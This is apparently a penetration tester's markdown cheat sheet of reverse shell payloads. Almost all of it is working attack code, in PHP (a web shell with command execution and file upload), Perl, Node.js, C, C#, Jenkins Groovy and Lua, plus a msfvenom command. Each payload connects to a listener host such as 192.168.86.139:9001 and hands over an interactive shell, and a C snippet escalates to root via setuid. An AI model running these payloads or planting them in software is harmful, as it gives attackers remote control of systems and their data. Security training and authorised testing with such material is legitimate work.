---
title: 📝 Reverse Shells
tags: #cheatsheet
---
### php reverse shell
You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
```php
<?php 
  if(!empty($_POST[1])){
    if (!empty($_POST["b"])){
      pclose(popen($_POST[1], 'r'));
    } else{
      system($_POST[1]);
    }
  }

  if(!empty($_FILES["f"])){
    move_uploaded_file($_FILES['f']['tmp_name'], basename($_FILES['f']['name']));
  }
?>
```

### perl reverse shell
```perl
# Example 1
perl -e 'use Socket;$i="192.168.86.139";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Example 2
use Socket

$i="192.168.86.139";
$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
```

### nodejs reverse shell
```js
# Example 1
require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')

# Example 2
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9001, "192.168.86.139", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

### c reverse shell
```cpp
######################### Example 1 #############################
## Compile : gcc -shared -o libchill.so -fPIC libchill.c

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int greetings(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}


######################### Example 2 #############################
## Compile : gcc shell.c -o shell

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.86.139");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

### c# reverse shell
This c-sharp reverse shell is from [PuckieStyle Blog](https://www.puckiestyle.nl/c-simple-reverse-shell/)._Note: Change `cmd.exe` to `bash` if you are using against linux environment_
```cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.0.2.15", 443))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### jenkins reverse shell
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.86.139/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### lua reverse shell
```lua
# Example 1
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")

# Example 2
lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")'
```

### jsp reverse shell
```java
# Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw > shell.jsp
```

## References
* https://github.com/H0j3n/EzpzShell
* https://www.revshells.com/